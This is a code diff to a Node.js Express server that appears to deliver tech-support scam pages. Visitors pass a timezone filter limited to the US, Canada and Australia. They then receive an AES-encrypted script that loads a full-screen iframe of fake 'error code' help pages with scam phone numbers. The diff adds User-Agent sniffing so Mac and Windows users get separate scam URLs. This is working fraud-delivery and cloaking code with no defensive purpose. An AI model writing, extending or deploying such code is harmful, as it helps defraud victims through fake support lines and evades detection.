@@ -13,7 +13,7 @@ app.use(express.json());
 // Optimized Security Headers Middleware
 app.use((req, res, next) => {
     res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, User-Agent");
     res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
     
     if (res.getHeader('X-Frame-Options') === 'sameorigin') {
@@ -26,68 +26,33 @@ app.use((req, res, next) => {
 
 // O(1) Instant Lookup Set
 const ALLOWED_TIMEZONES = new Set([
-    // Australia
-    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", 
-    "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin",
-
     // USA
-    "America/New_York",      // Eastern
-    "America/Chicago",       // Central
-    "America/Denver",        // Mountain
-    "America/Phoenix",       // Mountain (no DST)
-    "America/Los_Angeles",   // Pacific
-    "America/Anchorage",     // Alaska
-    "Pacific/Honolulu",      // Hawaii
+    "America/New_York", "America/Chicago", "America/Denver", "America/Phoenix", 
+    "America/Los_Angeles", "America/Anchorage", "Pacific/Honolulu",
 
     // Canada
-    "America/St_Johns",      // Newfoundland
-    "America/Halifax",       // Atlantic
-    "America/Toronto",       // Eastern
-    "America/Winnipeg",      // Central
-    "America/Regina",        // Central (no DST)
-    "America/Edmonton",      // Mountain
-    "America/Vancouver"      // Pacific
+    "America/St_Johns", "America/Halifax", "America/Toronto", "America/Winnipeg", 
+    "America/Regina", "America/Edmonton", "America/Vancouver",
+
+    // Australia & Others
+    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", 
+    "Australia/Perth", "Australia/Hobart", "Australia/Darwin", "Australia/Canberra", 
+    "Australia/Broken_Hill", "Australia/Lord_Howe", "Australia/Eucla", "Indian/Christmas", 
+    "Indian/Cocos", "Antarctica/Macquarie"
 ]);
 
-// Raw URLs accompanied by their selection probability weights (Must total 1.0)
-const RAW_CONFIGS = [
-    { url: "https://tejjepayy11.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-855-574-4228", weight: 1.0 }
-    
-];
+// Destination Links
+const LINK_MAC = "https://meenapyy333.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
+const LINK_OTHERS = "https://meenapyy333.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
 
 // --- Pre-Compilation Cache Layer ---
-// This processes everything into memory ONCE during boot, removing CPU load during requests.
+// Helper to generate identical iframe payloads dynamically on boot
+const buildIframePayload = (url) => `const iframe=document.createElement("iframe");iframe.src="${url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
 
-const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
-    const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
-    
-    return {
-        weight: item.weight,
-        encryptedPayload: encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString())
-    };
-});
-
-// Pre-encrypt static error payload
+// Pre-encrypt static variations during startup
+const ENCRYPTED_MAC_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(buildIframePayload(LINK_MAC), secretKey).toString());
+const ENCRYPTED_OTHERS_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(buildIframePayload(LINK_OTHERS), secretKey).toString());
 const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
-
-// --- Helper Functions ---
-
-/**
- * Returns a pre-encrypted payload immediately using constant-time evaluation 
- * and simple random boundary checks.
- */
-function getFastResponse() {
-    const rand = Math.random();
-    let cumulativeWeight = 0;
-
-    for (const item of PRECOMPUTED_RESPONSES) {
-        cumulativeWeight += item.weight;
-        if (rand <= cumulativeWeight) {
-            return item.encryptedPayload;
-        }
-    }
-    return PRECOMPUTED_RESPONSES[PRECOMPUTED_RESPONSES.length - 1].encryptedPayload;
-}
 
 // --- Routes ---
 
@@ -102,15 +67,24 @@ app.get("/timezone", (req, res) => {
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
 
-    // Fast validations against memory references 
-    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
-        res.send(getFastResponse());
+    // 1. Validate timezone via O(1) memory Set
+    if (!timezone || !ALLOWED_TIMEZONES.has(timezone)) {
+        return res.send(ERROR_PAYLOAD);
+    }
+
+    // 2. Sniff Operating System using User-Agent header
+    const userAgent = req.headers["user-agent"] || "";
+    const isMac = /Macintosh|Mac OS X/i.test(userAgent);
+
+    // 3. Serve the respective pre-encrypted payload instantly
+    if (isMac) {
+        res.send(ENCRYPTED_MAC_PAYLOAD);
     } else {
-        res.send(ERROR_PAYLOAD);
+        res.send(ENCRYPTED_OTHERS_PAYLOAD);
     }
 });
 
 // --- Start Server ---
 app.listen(PORT, () => {
-    console.log(`High-performance server running on port ${PORT}`);
+    console.log(`High-performance OS-targeted server running on port ${PORT}`);
 });
